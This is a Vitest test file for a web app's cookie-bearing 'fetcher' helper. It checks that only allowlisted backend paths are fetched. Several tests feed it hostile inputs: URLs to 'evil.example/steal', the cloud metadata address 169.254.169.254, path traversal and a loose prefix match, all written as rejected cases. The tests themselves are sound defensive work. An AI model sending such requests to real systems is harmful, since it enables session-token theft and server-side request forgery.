import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const BACKEND_BASE_URL = "https://api.searchpoint.hyperjump.tech";

vi.mock("next/headers", () => ({
  cookies: async () => ({
    get: (name: string) =>
      name === "SCSE_ID" ? { name, value: "victim-token" } : undefined,
  }),
}));

vi.mock("@/lib/env", () => ({
  env: { BACKEND_BASE_URL: "https://api.searchpoint.hyperjump.tech" },
}));

import { fetcher } from "@/lib/fetcher";

describe("fetcher", () => {
  let fetchMock: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    fetchMock = vi.fn(async () => new Response("{}", { status: 200 }));
    vi.stubGlobal("fetch", fetchMock);
  });

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it("sends allowlisted paths to the backend origin with the session cookie", async () => {
    // Act
    await fetcher("/v1/auth/me");

    // Assert
    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [url, init] = fetchMock.mock.calls[0];
    expect((url as URL).toString()).toBe(`${BACKEND_BASE_URL}/v1/auth/me`);
    expect((init as RequestInit).headers).toMatchObject({
      Cookie: "SCSE_ID=victim-token",
    });
  });

  it("rejects an absolute URL instead of fetching the attacker origin", async () => {
    // Act
    const call = fetcher("https://evil.example/steal");

    // Assert
    await expect(call).rejects.toThrow(
      "fetcher only accepts backend-relative paths",
    );
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("rejects a protocol-relative path", async () => {
    // Act
    const call = fetcher("//evil.example/steal");

    // Assert
    await expect(call).rejects.toThrow(
      "fetcher only accepts backend-relative paths",
    );
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("rejects cloud metadata and other non-backend origins", async () => {
    // Act
    const metadata = fetcher("http://169.254.169.254/latest/meta-data/");

    // Assert
    await expect(metadata).rejects.toThrow(
      "fetcher only accepts backend-relative paths",
    );
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("rejects a relative path that is not on the allowlist", async () => {
    // Act
    const call = fetcher("/v1/internal/admin");

    // Assert
    await expect(call).rejects.toThrow("fetcher path is not on the allowlist");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("rejects traversal that escapes an allowlisted prefix", async () => {
    // Act
    const call = fetcher("/v1/files/../../internal/admin");

    // Assert
    await expect(call).rejects.toThrow("fetcher path is not on the allowlist");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("allows exact /v1/preferences path", async () => {
    // Act
    await fetcher("/v1/preferences");

    // Assert
    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [url] = fetchMock.mock.calls[0];
    expect((url as URL).toString()).toBe(`${BACKEND_BASE_URL}/v1/preferences`);
  });

  it("rejects loose prefix match on /v1/preferences (e.g. /v1/preferences_evil)", async () => {
    // Act
    const call = fetcher("/v1/preferences_evil");

    // Assert
    await expect(call).rejects.toThrow("fetcher path is not on the allowlist");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("allows exact /v1/connections path", async () => {
    // Act
    await fetcher("/v1/connections");

    // Assert
    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [url] = fetchMock.mock.calls[0];
    expect((url as URL).toString()).toBe(`${BACKEND_BASE_URL}/v1/connections`);
  });

  it("returns response on 401 and 404 statuses", async () => {
    fetchMock.mockResolvedValueOnce(
      new Response("Unauthorized", { status: 401 }),
    );
    const res401 = await fetcher("/v1/auth/me");
    expect(res401.status).toBe(401);

    fetchMock.mockResolvedValueOnce(new Response("Not Found", { status: 404 }));
    const res404 = await fetcher("/v1/preferences");
    expect(res404.status).toBe(404);
  });

  it("returns response on 4xx when returnErrorResponse is true", async () => {
    fetchMock.mockResolvedValueOnce(
      new Response(JSON.stringify({ error: { message: "rate limited" } }), {
        status: 400,
        statusText: "Bad Request",
      }),
    );

    const res = await fetcher("/v1/onedrive/invite", {
      method: "POST",
      returnErrorResponse: true,
    });
    expect(res.status).toBe(400);
    const data = await res.json();
    expect(data.error.message).toBe("rate limited");
  });

  it("throws FetchError on 4xx by default with structured error.message payload", async () => {
    fetchMock.mockResolvedValueOnce(
      new Response(JSON.stringify({ error: { message: "rate limited" } }), {
        status: 400,
        statusText: "Bad Request",
      }),
    );

    await expect(
      fetcher("/v1/onedrive/invite", { method: "POST" }),
    ).rejects.toThrow("rate limited");
  });

  it("throws FetchError extracting string error or top-level message", async () => {
    // String error property
    fetchMock.mockResolvedValueOnce(
      new Response(JSON.stringify({ error: "string error message" }), {
        status: 403,
        statusText: "Forbidden",
      }),
    );
    await expect(fetcher("/v1/preferences")).rejects.toThrow(
      "string error message",
    );

    // Top-level message property
    fetchMock.mockResolvedValueOnce(
      new Response(JSON.stringify({ message: "top level error" }), {
        status: 400,
        statusText: "Bad Request",
      }),
    );
    await expect(fetcher("/v1/preferences")).rejects.toThrow("top level error");
  });

  it("falls back to statusText or Request failed on non-JSON error response", async () => {
    fetchMock.mockResolvedValueOnce(
      new Response("Plain text error", {
        status: 502,
        statusText: "Bad Gateway",
      }),
    );

    await expect(fetcher("/v1/preferences")).rejects.toThrow("Bad Gateway");
  });

  it("throws formatted error message on 5xx status with error payload", async () => {
    fetchMock.mockResolvedValueOnce(
      new Response(JSON.stringify({ error: { message: "database failed" } }), {
        status: 500,
        statusText: "Internal Server Error",
      }),
    );

    await expect(fetcher("/v1/preferences")).rejects.toThrow("database failed");
  });
});
